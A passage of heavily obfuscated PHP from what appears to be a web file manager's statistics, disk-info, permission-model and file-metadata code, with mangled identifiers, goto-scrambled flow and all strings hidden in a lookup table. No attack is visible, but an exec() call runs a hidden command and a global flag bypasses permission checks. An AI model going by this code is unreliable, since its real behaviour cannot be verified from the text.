0))->count($Eù²ë„­ÉŠ[381]); $E›ã²ÉŠÑÜ = array($Eù²ë„­ÉŠ[382] => 0, $Eù²ë„­ÉŠ[191] => array($Eù²ë„­ÉŠ[931], strtotime(date($Eù²ë„­ÉŠ[2049])))); goto D«Ğ—ƒ†½; D«Ğ—ƒ†½: $bÂèâò˜õ› = Model($Eù²ë„­ÉŠ[758])->where($E›ã²ÉŠÑÜ)->sum($Eù²ë„­ÉŠ[77]); $cÑ”äË˜­ = Model($Eù²ë„­ÉŠ[758])->where($E›ã²ÉŠÑÜ)->count($Eù²ë„­ÉŠ[381]); return array($Eù²ë„­ÉŠ[704] => $A²ÃôòŞ†‚, $Eù²ë„­ÉŠ[2042] => $f¦Ü²ã «, $Eù²ë„­ÉŠ[2075] => $A²ÃôòŞ†‚ - $f¦Ü²ã «, $Eù²ë„­ÉŠ[2076] => (int) $bÂèâò˜õ›, $Eù²ë„­ÉŠ[706] => (int) $Eì®ÃËîî…, $Eù²ë„­ÉŠ[2077] => (int) $cÑ”äË˜­); goto fÇ•îºÚÇ; fÇ•îºÚÇ: } private function optionAccess() { $Aïµ¡ÑÆŠÙ =& $_SERVER[‡’¶øåüç˜]; return array($Aïµ¡ÑÆŠÙ[701] => $this->typeLogCnt(), $Aïµ¡ÑÆŠÙ[103] => $this->typeLogCnt($Aïµ¡ÑÆŠÙ[103]), $Aïµ¡ÑÆŠÙ[416] => $this->typeLogCnt($Aïµ¡ÑÆŠÙ[416]), $Aïµ¡ÑÆŠÙ[2078] => $this->typeLogCnt($Aïµ¡ÑÆŠÙ[2078]), $Aïµ¡ÑÆŠÙ[2079] => $this->typeLogCnt($Aïµ¡ÑÆŠÙ[2079]), $Aïµ¡ÑÆŠÙ[547] => $this->typeLogCnt($Aïµ¡ÑÆŠÙ[33], $Aïµ¡ÑÆŠÙ[2053])); } private function typeLogCnt($dÃ¬æéÉ†Ç = '', $b°øÕÙÙ†– = "\x69\x64") { goto C—½ÌÊ‰…Š; C—½ÌÊ‰…Š: $d“²ÚÎö†‹ =& $_SERVER[‡’¶øåüç˜]; $a·‚²Îßé = array($d“²ÚÎö†‹[103] => array($d“²ÚÎö†‹[2080], $d“²ÚÎö†‹[2081]), $d“²ÚÎö†‹[416] => array($d“²ÚÎö†‹[2082], $d“²ÚÎö†‹[2083]), $d“²ÚÎö†‹[2078] => array($d“²ÚÎö†‹[2084], $d“²ÚÎö†‹[2085], $d“²ÚÎö†‹[2086]), $d“²ÚÎö†‹[2079] => array($d“²ÚÎö†‹[2087], $d“²ÚÎö†‹[2088]), $d“²ÚÎö†‹[2089] => array($d“²ÚÎö†‹[2090], $d“²ÚÎö†‹[2091], $d“²ÚÎö†‹[2092])); $EÍÈ±Îİ¼â = strtotime(date($d“²ÚÎö†‹[2049])); goto aÀ‹Í÷¢›; aÀ‹Í÷¢›: $Bİââ¬…ğÍ = array($d“²ÚÎö†‹[191] => array($d“²ÚÎö†‹[931], $EÍÈ±Îİ¼â)); if ($dÃ¬æéÉ†Ç) { $Bİââ¬…ğÍ[$d“²ÚÎö†‹[29]] = array($d“²ÚÎö†‹[7], $a·‚²Îßé[$dÃ¬æéÉ†Ç]); } $aŒªèŒ¶á = Model($d“²ÚÎö†‹[2052])->where($Bİââ¬…ğÍ)->count($b°øÕÙÙ†–); goto e×ËóçÒÆ¯; e×ËóçÒÆ¯: return (int) $aŒªèŒ¶á; goto cé¨ÙÀîè; cé¨ÙÀîè: } private function optionServer() { goto Eì®«‚êŸ; F‘¸î†—é: $AŸšŸ˜¡àˆ = $E©Œ½Í½Æ‘[0]; $FóğßÖÜÈÚ = $GLOBALS[$AšĞ‘àš³[6]][$AšĞ‘àš³[17]]; $Fò‰·˜ª×š = $FóğßÖÜÈÚ[$AšĞ‘àš³[891]]; goto c¥ôÛ¨áŠ; c¥ôÛ¨áŠ: if ($Fò‰·˜ª×š == $AšĞ‘àš³[729]) { $A†¦èë÷†Ë = explode($AšĞ‘àš³[1083], $FóğßÖÜÈÚ[$AšĞ‘àš³[890]]); $Fò‰·˜ª×š = $A†¦èë÷†Ë[0]; } if ($Fò‰·˜ª×š == $AšĞ‘àš³[732] || $Fò‰·˜ª×š == $AšĞ‘àš³[733]) { $Cè®–±—†· = Model()->db()->query($AšĞ‘àš³[2093]); $fÂéğ¾ŒÖ¯ = $Cè®–±—†·[0] && isset($Cè®–±—†·[0][$AšĞ‘àš³[1347]]) ? $Cè®–±—†·[0][$AšĞ‘àš³[1347]] : 0; $Fò‰·˜ª×š = $AšĞ‘àš³[2094] . ($fÂéğ¾ŒÖ¯ ? $AšĞ‘àš³[8] . $fÂéğ¾ŒÖ¯ : $AšĞ‘àš³[33]); } $a‡ßßë×í” = $GLOBALS[$AšĞ‘àš³[6]][$AšĞ‘àš³[341]][$AšĞ‘àš³[760]]; goto c´Õö–ä§÷; fÙæø¿‰: $F­İ¥¾Úà© = array($AšĞ‘àš³[749] => $CÃ–¦†„ì[$AšĞ‘àš³[371]]); $C‚£Ü¦Úóõ = Model($AšĞ‘àš³[434])->where($F­İ¥¾Úà©)->sum($AšĞ‘àš³[77]); $E©Œ½Í½Æ‘ = explode($AšĞ‘àš³[50], $_SERVER[$AšĞ‘àš³[139]]); goto F‘¸î†—é; Eì®«‚êŸ: $AšĞ‘àš³ =& $_SERVER[‡’¶øåüç˜]; $Dù¾‘Ğ¬‰¿ = $this->diskDriver(); $CÃ–¦†„ì = KodIO::defaultDriver(); goto fÙæø¿‰; c´Õö–ä§÷: return array($AšĞ‘àš³[2095] => $Dù¾‘Ğ¬‰¿ ? $Dù¾‘Ğ¬‰¿[$AšĞ‘àš³[2096]] : 0, $AšĞ‘àš³[2097] => $Dù¾‘Ğ¬‰¿ ? $Dù¾‘Ğ¬‰¿[$AšĞ‘àš³[2098]] : 0, $AšĞ‘àš³[2099] => (int) $CÃ–¦†„ì[$AšĞ‘àš³[2096]] * 1024 * 1024 * 1024, $AšĞ‘àš³[2100] => (int) $C‚£Ü¦Úóõ, $AšĞ‘àš³[2101] => ucfirst($AŸšŸ˜¡àˆ), $AšĞ‘àš³[2102] => $AšĞ‘àš³[2103] . PHP_VERSION, $AšĞ‘àš³[2104] => phpBuild64() ? 64 : 32, $AšĞ‘àš³[700] => str_replace($AšĞ‘àš³[2105], $AšĞ‘àš³[907], $Fò‰·˜ª×š), $AšĞ‘àš³[341] => ucfirst($a‡ßßë×í”), $AšĞ‘àš³[28] => $_SERVER[$AšĞ‘àš³[2106]]); goto cƒò¸’‰Ù; cƒò¸’‰Ù: } private function diskDriver() { goto fÌµËª¡‰; c¦ç»ÉĞ—à: if ($aºĞ‰‰‚óŠ) { $Fô™£¯ïÎ‚ = $C¾ïÈÜÓØ[2109]; if (function_exists($C¾ïÈÜÓØ[2110])) { exec($C¾ïÈÜÓØ[2111], $d‹»˜öÇ©˜); $Fô™£¯ïÎ‚ = $d‹»˜öÇ©˜[1] . $C¾ïÈÜÓØ[8]; } } if (!file_exists($Fô™£¯ïÎ‚)) { return; } $a°·×’õÑ° = @disk_total_space($Fô™£¯ïÎ‚); goto b‡ŠÒ±íÔÙ; fÌµËª¡‰: $C¾ïÈÜÓØ =& $_SERVER[‡’¶øåüç˜]; $Fô™£¯ïÎ‚ = $C¾ïÈÜÓØ[8]; $aºĞ‰‰‚óŠ = $GLOBALS[$C¾ïÈÜÓØ[6]][$C¾ïÈÜÓØ[2107]] == $C¾ïÈÜÓØ[2108]; goto c¦ç»ÉĞ—à; b‡ŠÒ±íÔÙ: $e¥—£ôå² = $a°·×’õÑ° - @disk_free_space($Fô™£¯ïÎ‚); return array($C¾ïÈÜÓØ[2096] => $a°·×’õÑ°, $C¾ïÈÜÓØ[2098] => $e¥—£ôå²); goto dĞ¦Ü«“ë; dĞ¦Ü«“ë: } public function fileChart($c»íëÇ°Ê) { goto Aã¯©—šç“; B¸ŠñÄ‡Šƒ: $dÎÂùó¼êª[$a—ôÁíŸõ¦[383]] = 2; $D›†åœ²ó = Model($a—ôÁíŸõ¦[758])->where($dÎÂùó¼êª)->sum($a—ôÁíŸõ¦[77]); return array($a—ôÁíŸõ¦[704] => $Aµ”¢ÑÌĞ[$a—ôÁíŸõ¦[77]], $a—ôÁíŸõ¦[2042] => $Aµ”¢ÑÌĞ[$a—ôÁíŸõ¦[2042]], $a—ôÁíŸõ¦[2043] => (int) $F÷ïéâ”¶õ, $a—ôÁíŸõ¦[2044] => (int) $D›†åœ²ó); goto eöåù‹Åá°; d¦š¸ÙÓ£: $Aµ”¢ÑÌĞ = $this->sourceSize(); $dÎÂùó¼êª = array($a—ôÁíŸõ¦[474] => 0, $a—ôÁíŸõ¦[383] => 1); $F÷ïéâ”¶õ = Model($a—ôÁíŸõ¦[758])->where($dÎÂùó¼êª)->sum($a—ôÁíŸõ¦[77]); goto B¸ŠñÄ‡Šƒ; Aã¯©—šç“: $a—ôÁíŸõ¦ =& $_SERVER[‡’¶øåüç˜]; if (isset($c»íëÇ°Ê[$a—ôÁíŸõ¦[1443]])) { return Model($a—ôÁíŸõ¦[758])->userFileTypeProfile($c»íëÇ°Ê[$a—ôÁíŸõ¦[1443]]); } if (isset($c»íëÇ°Ê[$a—ôÁíŸõ¦[2112]])) { return Model($a—ôÁíŸõ¦[758])->groupFileTypeProfile($c»íëÇ°Ê[$a—ôÁíŸõ¦[2112]]); } goto d¦š¸ÙÓ£; eöåù‹Åá°: } private function sourceSize() { $c³òÒ›ó¾˜ =& $_SERVER[‡’¶øåüç˜]; $aõºÔ„øÓå = Model($c³òÒ›ó¾˜[758])->where(array($c³òÒ›ó¾˜[382] => 0))->sum($c³òÒ›ó¾˜[77]); $Dë¸õÌ¼¸’ = Model($c³òÒ›ó¾˜[434])->sum($c³òÒ›ó¾˜[77]); if ($Dë¸õÌ¼¸’ > $aõºÔ„øÓå) { $Dë¸õÌ¼¸’ = $aõºÔ„øÓå; } return array($c³òÒ›ó¾˜[77] => (int) $aõºÔ„øÓå, $c³òÒ›ó¾˜[2042] => (int) $Dë¸õÌ¼¸’); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $c‹òï‘Ñµ =& $_SERVER[‡’¶øåüç˜]; $cêÀŒå„¥š = array(array($c‹òï‘Ñµ[398] => LNG($c‹òï‘Ñµ[2113]), $c‹òï‘Ñµ[2114] => $c‹òï‘Ñµ[2115], $c‹òï‘Ñµ[2116] => 1, $c‹òï‘Ñµ[2117] => 1, $c‹òï‘Ñµ[2118] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($c‹òï‘Ñµ[398] => LNG($c‹òï‘Ñµ[2119]), $c‹òï‘Ñµ[2114] => $c‹òï‘Ñµ[2120], $c‹òï‘Ñµ[2116] => 2, $c‹òï‘Ñµ[2117] => 1, $c‹òï‘Ñµ[2118] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($c‹òï‘Ñµ[398] => LNG($c‹òï‘Ñµ[2121]), $c‹òï‘Ñµ[2114] => $c‹òï‘Ñµ[2122], $c‹òï‘Ñµ[2116] => 3, $c‹òï‘Ñµ[2117] => 1, $c‹òï‘Ñµ[2118] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($c‹òï‘Ñµ[398] => LNG($c‹òï‘Ñµ[2123]), $c‹òï‘Ñµ[2114] => $c‹òï‘Ñµ[2124], $c‹òï‘Ñµ[2116] => 4, $c‹òï‘Ñµ[2117] => 1, $c‹òï‘Ñµ[2118] => self::AUTH_SHOW | self::AUTH_VIEW), array($c‹òï‘Ñµ[398] => LNG($c‹òï‘Ñµ[2125]), $c‹òï‘Ñµ[2114] => $c‹òï‘Ñµ[2126], $c‹òï‘Ñµ[2116] => 5, $c‹òï‘Ñµ[2117] => 1, $c‹òï‘Ñµ[2118] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($c‹òï‘Ñµ[398] => LNG($c‹òï‘Ñµ[2127]), $c‹òï‘Ñµ[2114] => $c‹òï‘Ñµ[2128], $c‹òï‘Ñµ[2116] => 6, $c‹òï‘Ñµ[2117] => 1, $c‹òï‘Ñµ[2118] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($c‹òï‘Ñµ[398] => LNG($c‹òï‘Ñµ[2129]), $c‹òï‘Ñµ[2114] => $c‹òï‘Ñµ[2130], $c‹òï‘Ñµ[2116] => 7, $c‹òï‘Ñµ[2117] => 1, $c‹òï‘Ñµ[2118] => 0)); return $cêÀŒå„¥š; } public static function authCheck($aöÊ»´à¼ñ, $B¬«¿¿ÀÆÙ) { $aöÊ»´à¼ñ = intval($aöÊ»´à¼ñ); if (_get($GLOBALS, $_SERVER[‡’¶øåüç˜][470])) { return !0; } if ($aöÊ»´à¼ñ <= 0) { return !1; } if (($aöÊ»´à¼ñ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($aöÊ»´à¼ñ & $B¬«¿¿ÀÆÙ); } public static function authCheckShow($AêÖã…Ôõ) { return self::authCheck($AêÖã…Ôõ, self::AUTH_SHOW); } public static function authCheckView($eºâªø£æ¢) { return self::authCheck($eºâªø£æ¢, self::AUTH_VIEW); } public static function authCheckDownload($F¢¨½Ê·‡è) { return self::authCheck($F¢¨½Ê·‡è, self::AUTH_DOWNLOAD); } public static function authCheckUpload($BóÕ‰ä“¥Ú) { return self::authCheck($BóÕ‰ä“¥Ú, self::AUTH_UPLOAD); } public static function authCheckEdit($Bƒ¡´è÷) { return self::authCheck($Bƒ¡´è÷, self::AUTH_EDIT); } public static function authCheckRemove($bóµŞ‘¥×) { return self::authCheck($bóµŞ‘¥×, self::AUTH_REMOVE); } public static function authCheckShare($cà†Ç¢äøÒ) { return self::authCheck($cà†Ç¢äøÒ, self::AUTH_SHARE); } public static function authCheckComment($b§„ÉÖöÛ) { return self::authCheck($b§„ÉÖöÛ, self::AUTH_COMMENT); } public static function authCheckEvent($E‚—ƒ”››ò) { return self::authCheck($E‚—ƒ”››ò, self::AUTH_EVENT); } public static function authCheckRoot($dÈ©¤À™¹“) { return self::authCheck($dÈ©¤À™¹“, self::AUTH_ROOT); } public static function authCheckAction($D“ŒÁµ‰ƒ, $F«‹èæÎÌĞ) { goto CÉ²¿†; CÉ²¿†: $Bì‰¬­”‹¯ =& $_SERVER[‡’¶øåüç˜]; $D¿Óø‚ÏÓ‹ = array($Bì‰¬­”‹¯[2131] => self::AUTH_VIEW, $Bì‰¬­”‹¯[1048] => self::AUTH_DOWNLOAD, $Bì‰¬­”‹¯[103] => self::AUTH_UPLOAD, $Bì‰¬­”‹¯[2079] => self::AUTH_EDIT, $Bì‰¬­”‹¯[2078] => self::AUTH_REMOVE, $Bì‰¬­”‹¯[2089] => self::AUTH_SHARE, $Bì‰¬­”‹¯[345] => self::AUTH_COMMENT, $Bì‰¬­”‹¯[1431] => self::AUTH_EVENT, $Bì‰¬­”‹¯[1567] => self::AUTH_ROOT); if (!isset($D¿Óø‚ÏÓ‹[$F«‹èæÎÌĞ])) { return; } goto EÁô©åœİ’; f¬÷ğÃ×ï: if (($D“ŒÁµ‰ƒ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($D“ŒÁµ‰ƒ & $C»’å§Şİ…); goto E‘ğõáºâ¤; EÁô©åœİ’: $C»’å§Şİ… = $D¿Óø‚ÏÓ‹[$F«‹èæÎÌĞ]; $D“ŒÁµ‰ƒ = intval($D“ŒÁµ‰ƒ); if ($D“ŒÁµ‰ƒ <= 0) { return !1; } goto f¬÷ğÃ×ï; E‘ğõáºâ¤: } public static function authDisable($B—×Ø‚Ò÷Œ, $a¼—¨–‡Å¶) { if (intval($B—×Ø‚Ò÷Œ) <= 0) { return 0; } return intval($B—×Ø‚Ò÷Œ) & ~$a¼—¨–‡Å¶; } public $optionType = "\123\x79\x73\x74\145\155\56\x73\x6f\165\162\x63\145\101\165\x74\x68\x4c\151\163\164"; public $field = array("\156\x61\x6d\x65", "\141\x75\x74\150", "\154\x61\142\145\154", "\x64\151\x73\x70\x6c\x61\x79", "\x73\x79\163\164\145\x6d", "\163\x6f\162\164"); public function initData() { $dŸÖ“ÊÈã² = $this->authDefault(); foreach ($dŸÖ“ÊÈã² as $F¿ŒéÂ®ë) { $this->add($F¿ŒéÂ®ë); } } public function listData($dĞ¦ô¸­ââ = false, $a›ñŠÂ¿éÙ = "\x73\x6f\162\x74", $eóàø°©‚ = false) { return parent::listData($dĞ¦ô¸­ââ, $a›ñŠÂ¿éÙ, $eóàø°©‚); } public function update($cŠ’…¬’Ä‚, $c¿Ö¦¤©ïê) { $F‹±Ûëâ× =& $_SERVER[‡’¶øåüç˜]; $dš×ƒ¾½ÌÁ = parent::listData($cŠ’…¬’Ä‚); $cù¤‹ùãÆÜ = $this->findByName($c¿Ö¦¤©ïê[$F‹±Ûëâ×[28]]); if (!$dš×ƒ¾½ÌÁ || $cù¤‹ùãÆÜ && $cù¤‹ùãÆÜ[$F‹±Ûëâ×[371]] != $dš×ƒ¾½ÌÁ[$F‹±Ûëâ×[371]]) { return !1; } $this->filterAuth($c¿Ö¦¤©ïê[$F‹±Ûëâ×[388]]); return parent::update($cŠ’…¬’Ä‚, $c¿Ö¦¤©ïê); } public function remove($BÜ‡±Ô³¸Å) { $b½ˆ³Îà² = parent::listData($BÜ‡±Ô³¸Å); if (!$b½ˆ³Îà² || $b½ˆ³Îà²[$_SERVER[‡’¶øåüç˜][1087]]) { return !1; } return parent::remove($BÜ‡±Ô³¸Å); } public function add($D«Û¥æ½¨¦ = array()) { goto aºÂâÛ…Œ; C†‰è…±Â: return parent::insert($D«Û¥æ½¨¦); goto FÙ—ïàÀÖ½; EĞùêîá: $D«Û¥æ½¨¦ = array_merge($DíÕ½²ƒô¬, $D«Û¥æ½¨¦); $D«Û¥æ½¨¦[$aô’Î§›±Š[2134]] = $this->getSort(); $this->filterAuth($D«Û¥æ½¨¦[$aô’Î§›±Š[388]]); goto C†‰è…±Â; aºÂâÛ…Œ: $aô’Î§›±Š =& $_SERVER[‡’¶øåüç˜]; if ($this->findByName($D«Û¥æ½¨¦[$aô’Î§›±Š[28]])) { return !1; } $DíÕ½²ƒô¬ = array($aô’Î§›±Š[28] => $aô’Î§›±Š[33], $aô’Î§›±Š[388] => 1, $aô’Î§›±Š[2132] => $aô’Î§›±Š[2122], $aô’Î§›±Š[2133] => 1, $aô’Î§›±Š[1087] => 0, $aô’Î§›±Š[2134] => 0); goto EĞùêîá; FÙ—ïàÀÖ½: } private function getSort() { $d ğ´çÅ¯È =& $_SERVER[‡’¶øåüç˜]; $F†¢Ì„¿Ï¥ = parent::listData(); $c‚ˆÕšâ = array_to_keyvalue($F†¢Ì„¿Ï¥, $d ğ´çÅ¯È[33], $d ğ´çÅ¯È[2134]); return empty($c‚ˆÕšâ) ? 0 : max($c‚ˆÕšâ) + 1; } private function filterAuth(&$a‚’àÓùÁ) { goto cÍ’çÂ«ì„; dˆ˜°ô¹×: foreach ($d¶¹·›†‹Œ as $d–®¸î—×) { if ($a‚’àÓùÁ & $d–®¸î—×) { $E´ïä†Ø½£[] = $d–®¸î—×; } } if (in_array(self::AUTH_ROOT, $E´ïä†Ø½£)) { $a‚’àÓùÁ = array_sum($d¶¹·›†‹Œ); return; } $eµ–Â”ƒÖ¯ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto FÑ‰è½¤ç; FÑ‰è½¤ç: foreach ($E´ïä†Ø½£ as $d–®¸î—×) { if (isset($eµ–Â”ƒÖ¯[$d–®¸î—×])) { $E´ïä†Ø½£ = array_merge($E´ïä†Ø½£, $eµ–Â”ƒÖ¯[$d–®¸î—×]); } } $E´ïä†Ø½£[] = self::AUTH_SHOW; $a‚’àÓùÁ = array_sum(array_unique($E´ïä†Ø½£)); goto báèâ‘À³ë; cÍ’çÂ«ì„: if (!$a‚’àÓùÁ) { return; } $d¶¹·›†‹Œ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $E´ïä†Ø½£ = array(); goto dˆ˜°ô¹×; báèâ‘À³ë: } public function sort($CÆåí¬Á™, $F½ ø¨¼Ò«) { return parent::update($CÆåí¬Á™, $F½ ø¨¼Ò«); } } goto C°ø»˜É; dó›”«Å à: function beforeShutdown() { Hook::trigger($_SERVER[úÎ][32]); } $_SERVER[$_SERVER[úÎ][33]] = BASIC_PATH; $_SERVER[$_SERVER[úÎ][34]] = LIB_DIR; goto F“§Â›Î÷Î; FŸ…³ÇØÍ: class GetInfo { private static $fileTypeArray; public static function get($BÑ¿…æ—éÜ) { $EÊ•¦ÑËˆ« = IO::info($BÑ¿…æ—éÜ); return self::infoAdd($EÊ•¦ÑËˆ«); } public static function check() { } public static function infoAdd(&$fê¯¹²ƒ¶ã) { goto CÛõ’‘Î“¥; a·÷©˜…ë: $dâ¨¨œ³Ş = self::arrayValueLimit($dâ¨¨œ³Ş); $dâ¨¨œ³Ş[$eõŠ³ªÏ–Ë[384]] = $d¥¦¤¬…æ; $fê¯¹²ƒ¶ã[$eõŠ³ªÏ–Ë[160]] = $dâ¨¨œ³Ş; goto F‹“×ˆË‰±; F‹“×ˆË‰±: return $fê¯¹²ƒ¶ã; goto FÍÇ©ßÂ®; b©ŒÔ­¨À: if (!$fê¯¹²ƒ¶ã || $fê¯¹²ƒ¶ã[$eõŠ³ªÏ–Ë[29]] != $eõŠ³ªÏ–Ë[171]) { return; } if (!self::support($fê¯¹²ƒ¶ã[$eõŠ³ªÏ–Ë[165]]) || isset($fê¯¹²ƒ¶ã[$eõŠ³ªÏ–Ë[160]])) { return; } $cÒ““§Ô·² = $eõŠ³ªÏ–Ë[1617] . $fê¯¹²ƒ¶ã[$eõŠ³ªÏ–Ë[75]]; goto a‰²‡Œ——ß; CÛõ’‘Î“¥: $eõŠ³ªÏ–Ë =& $_SERVER[‡’¶øåüç˜]; static $fö»¤±µ–; if (!$fö»¤±µ–) { require SDK_DIR . $eõŠ³ªÏ–Ë[1616]; $fö»¤±µ– = new getID3(); } goto b©ŒÔ­¨À; a‰²‡Œ——ß: $d¥¦¤¬…æ = $fê¯¹²ƒ¶ã[$eõŠ³ªÏ–Ë[165]]; try { if ($fê¯¹²ƒ¶ã[$eõŠ³ªÏ–Ë[165]] == $eõŠ³ªÏ–Ë[1618]) { $dâ¨¨œ³Ş = self::psdParse($cÒ““§Ô·²); $d¥¦¤¬…æ = $eõŠ³ªÏ–Ë[1619]; } else { if ($fê¯¹²ƒ¶ã[$eõŠ³ªÏ–Ë[165]] == $eõŠ³ªÏ–Ë[1620]) { $dâ¨¨œ³Ş = self::pdfParse($cÒ““§Ô·²); } else { $d¥¦¤¬…æ = self::$fileTypeArray[$eõŠ³ªÏ–Ë[1621]][$fê¯¹²ƒ¶ã[$eõŠ³ªÏ–Ë[165]]]; $BŠ™Ìº“á = self::$fileTypeArray[$eõŠ³ªÏ–Ë[1622]][$d¥¦¤¬…æ][$eõŠ³ªÏ–Ë[1623]]; $cŸŒ” Æ” = @$fö»¤±µ–->analyze($cÒ““§Ô·², $fê¯¹²ƒ¶ã[$eõŠ³ªÏ–Ë[77]], $fê¯¹²ƒ¶ã[$eõŠ³ªÏ–Ë[28]]); $dâ¨¨œ³Ş = self::parseData($cŸŒ” Æ”, $BŠ™Ìº“á, $fê¯¹²ƒ¶ã); } } } catch (Exception $déâê“Öà) { $dâ¨¨œ³Ş = array($eõŠ³ªÏ–Ë[384] => $d¥¦¤¬…æ); } if (!$dâ¨¨œ³Ş) { return; } goto a·÷©˜…ë; FÍÇ©ßÂ®: } public static function support($eöÕÈÕ¦Å) { goto cÒÃ´İö‚Š; E‰³Ä’½: $AôªâŠ§¾À = array($e·”²š¤×œ[1620], $e·”²š¤×œ[1618]); if (in_array($eöÕÈÕ¦Å, $AôªâŠ§¾À)) { return !0; } if (isset(self::$fileTypeArray[$e·”²š¤×œ[1621]][$eöÕÈÕ¦Å])) { return !0; } goto DøŠ©µƒà²; cÒÃ´İö‚Š: $e·”²š¤×œ =& $_SERVER[‡’¶øåüç˜]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $eöÕÈÕ¦Å = strtolower($eöÕÈÕ¦Å); goto E‰³Ä’½; DøŠ©µƒà²: return !1; goto c¡­†‘Š‚; c¡­†‘Š‚: } public static function arrayValueLimit($FÆå—³˜¦, $C‘½Áá×¢ = 5000) { if (!is_array($FÆå—³˜¦)) { return $FÆå—³˜¦; } foreach ($FÆå—³˜¦ as $f¹Ô” ñÙ => $c÷‚”Ò…) { if (is_string($c÷‚”Ò…) && strlen($c÷‚”Ò…) > $C‘½Áá×¢) { $FÆå—³˜¦[$f¹Ô” ñÙ] = substr($c÷‚”Ò…, 0, $C‘½Áá×¢); } else { if (is_array($c÷‚”Ò…)) { $FÆå—³˜¦[$f¹Ô” ñÙ] = self::arrayValueLimit($c÷‚”Ò…, $C‘½Áá×¢); } } } return $FÆå—³˜¦; } private static function parseData($eß­Œ¼­¦, $cæ­§Ñ²’Ì, $FƒØÆ…º¶Ô) { $C¶®Øïé»Ü =& $_SERVER[‡’¶øåüç˜]; $cØ¼¦Â›«„ = $eß­Œ¼­¦[$C¶®Øïé»Ü[1624]]; $bŸ±ãóŒ‹” = array(); foreach ($cæ­§Ñ²’Ì as $eè…®Ğ¨ó¯ => $CÄÑÎçáºº) { foreach ($CÄÑÎçáºº as $d½ê…Ä˜Ìê) { if (is_array($d½ê…Ä˜Ìê)) { $A¯¿ÆŸ‘ª­ = self::parseData($eß­Œ¼­¦, $CÄÑÎçáºº, $FƒØÆ…º¶Ô); if ($A¯¿ÆŸ‘ª­) { $bŸ±ãóŒ‹”[$eè…®Ğ¨ó¯] = $A¯¿ÆŸ‘ª­; } break; } $aó­šã®Ü‚ = str_replace($C¶®Øïé»Ü[1396], $cØ¼¦Â›«„, $d½ê…Ä˜Ìê); $A¯¿ÆŸ‘ª­ = _get($eß­Œ¼­¦, $aó­šã®Ü‚); $A¯¿ÆŸ‘ª­ = is_array($A¯¿ÆŸ‘ª­) ? $A¯¿ÆŸ‘ª­[0] : $A¯¿ÆŸ‘ª­; if ($A¯¿ÆŸ‘ª­) { break; } } if ($A¯¿ÆŸ‘ª­ || $A¯¿ÆŸ‘ª­ === 0 || $A¯¿ÆŸ‘ª­ === !1) { $A¯¿ÆŸ‘ª­ = self::valueReset($d½ê…Ä˜Ìê, $A¯¿ÆŸ‘ª­, $eè…®Ğ¨ó¯); if ($A¯¿ÆŸ‘ª­ !== null) { $bŸ±ãóŒ‹”[$eè…®Ğ¨ó¯] = $A¯¿ÆŸ‘ª­; } } } $bŸ±ãóŒ‹” = self::valueResetAll($bŸ±ãóŒ‹”, $FƒØÆ…º¶Ô); return $bŸ±ãóŒ‹”; } private static function psdParse($Fç¸ä„ÓãÏ) { $e„–„¡öÜâ =& $_SERVER[‡’¶øåüç˜]; if (IO::fileSubstr($Fç¸ä„ÓãÏ, 0, 4) != $e„–„¡öÜâ[1625]) { return !1; } $b‰“ä÷ê = getImageSize($Fç¸ä„ÓãÏ, $bŸ±Œ«ÒÎ); if (!$b‰“ä÷ê) { return; } $aŒğÄÜãœÔ = array($e„–„¡öÜâ[162] => $b‰“ä÷ê[0], $e„–„¡öÜâ[163] => $b‰“ä÷ê[1]); return $aŒğÄÜãœÔ; } private static function pdfParse($F‘Š‡¤”®) { return FileParsePdf::parse($F‘Š‡¤”®); } private static function fileTypeParse() { $C¡¿…Ğ‡ğ =& $_SERVER[‡’¶øåüç˜]; $Dä•è…±æ¬ = self::fileTypeArray(); $fÉ¬õ©»ğ× = array(); foreach ($Dä•è…±æ¬ as $e›‡Ö£ÈéÎ => $A—ñ„ŠøïÙ) { $BÊÛ…‹İ•‰ = _get($A—ñ„ŠøïÙ, $C¡¿…Ğ‡ğ[165], $C¡¿…Ğ‡ğ[33]); $BÑŸëÅ¾œ = is_string($BÊÛ…‹İ•‰) ? explode($C¡¿…Ğ‡ğ[47], $BÊÛ…‹İ•‰) : $BÊÛ…‹İ•‰; if (!$BÑŸëÅ¾œ) { continue; } foreach ($BÑŸëÅ¾œ as $BÊÛ…‹İ•‰) { $BÊÛ…‹İ•‰ = strtolower(trim($BÊÛ…‹İ•‰)); if (!$BÊÛ…‹İ•‰) { continue; } 